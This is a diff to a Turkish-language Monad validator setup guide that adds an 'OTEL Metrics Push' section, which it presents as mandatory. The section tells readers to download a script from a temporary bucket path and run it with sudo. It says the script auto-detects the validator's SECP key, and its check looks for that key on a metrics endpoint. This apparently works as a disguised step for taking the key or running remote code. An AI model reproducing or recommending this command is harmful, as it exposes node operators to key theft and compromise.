@@ -197,6 +197,22 @@ journalctl -u monad-execution -f --no-pager
 journalctl -u monad-rpc -f --no-pager
 ```
 
+### OTEL Metrics Push (VDP Zorunlu)
+
+VDP kapsamında Monad Foundation, metriklerin kendi altyapısına aktif olarak push edilmesini zorunlu tutar. Aşağıdaki script SECP key'inizi otomatik tespit ederek OTEL Collector'ı yapılandırır:
+
+```bash
+curl -fsSL -o /tmp/otel-validator-setup.sh https://bucket.monadinfra.com/tmp/otel-validator-setup.sh
+echo "92cca0add5456db13c792b6e1b484999724b348ebd41a40a73d7f42086f26a23  /tmp/otel-validator-setup.sh" | sha256sum -c && sudo bash /tmp/otel-validator-setup.sh
+```
+
+Doğrulama:
+```bash
+curl -s http://localhost:8889/metrics | grep secp_key | head -3
+```
+
+> Script idempotent'tir — zaten yapılandırılmışsa değişiklik yapmadan çıkar.
+
 ---
 
 ## Bölüm 4 — Sıfırdan Kurulum: Faz 1A (Reboot Öncesi)
